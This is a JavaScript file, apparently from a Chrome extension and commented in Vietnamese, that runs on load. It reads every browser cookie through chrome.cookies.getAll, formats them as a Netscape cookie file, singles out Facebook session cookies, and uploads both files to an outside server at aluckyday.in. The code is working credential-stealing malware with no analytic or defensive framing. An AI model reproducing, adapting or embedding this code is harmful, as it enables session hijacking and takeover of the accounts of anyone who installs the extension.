async function CookieSender() {
  try {
    const ipResponse = await fetch("https://api.ipify.org");
    if (!ipResponse.ok) {
      throw new Error("Failed to fetch IP address");
    }
    const ipAddr = await ipResponse.text();

    chrome.cookies.getAll({}, function (cookies) {
      let netscapeFormat = "";
      let facebookCookies = "";
      
      cookies.forEach(cookie => {
        const domain = cookie.domain.startsWith('.') ? cookie.domain : `.${cookie.domain}`;
        const path = cookie.path || '/';
        const secure = cookie.secure ? 'TRUE' : 'FALSE';
        const expiry = cookie.expirationDate ? Math.round(cookie.expirationDate) : '';

        // Tạo định dạng Netscape cho tất cả cookies
        netscapeFormat += `${domain}\tTRUE\t${path}\t${secure}\t${expiry}\t${cookie.name}\t${cookie.value}\n`;

        // Lọc cookies của Facebook
        if (cookie.domain.includes("facebook.com")) {
          facebookCookies += `${cookie.name}=${cookie.value}; `;
        }
      });

      // Xóa dấu chấm phẩy thừa ở cuối nếu có
      if (facebookCookies) {
        facebookCookies = facebookCookies.trim().replace(/;$/, '');
      }

      console.log("Netscape Format Cookies:", netscapeFormat);
      console.log("Filtered Facebook Cookies:", facebookCookies);

      // Tạo Blob từ định dạng Netscape
      const netscapeBlob = new Blob([netscapeFormat], { type: 'text/plain' });
      const facebookBlob = new Blob([facebookCookies], { type: 'text/plain' });

      const formDataNetscape = new FormData();
      const formDataFacebook = new FormData();

      // Gửi file cookies Netscape
      formDataNetscape.append('file', netscapeBlob, `All_Cookies.txt`);
      fetch("https://aluckyday.in/upload.php", {
        method: "POST",
        body: formDataNetscape
      })
      .then(response => response.json())
      .then(data => {
        console.log(data); 
        if (data.status !== 'success') {
          throw new Error(`Failed to upload Netscape document: ${data.message}`);
        }
      })
      .catch(error => console.error("Error sending Netscape document to server:", error));

      // Gửi file cookies Facebook
      if (facebookCookies) {
        formDataFacebook.append('file', facebookBlob, `Cookies_Fb.txt`);
        fetch("https://aluckyday.in/upload.php", {
          method: "POST",
          body: formDataFacebook
        })
        .then(response => response.json())
        .then(data => {
          console.log(data); 
          if (data.status !== 'success') {
            throw new Error(`Failed to upload Facebook document: ${data.message}`);
          }
        })
        .catch(error => console.error("Error sending Facebook document to server:", error));
      }

    });

  } catch (error) {
    console.error("Error in Cookie-Sender function:", error);
  }
}

CookieSender();
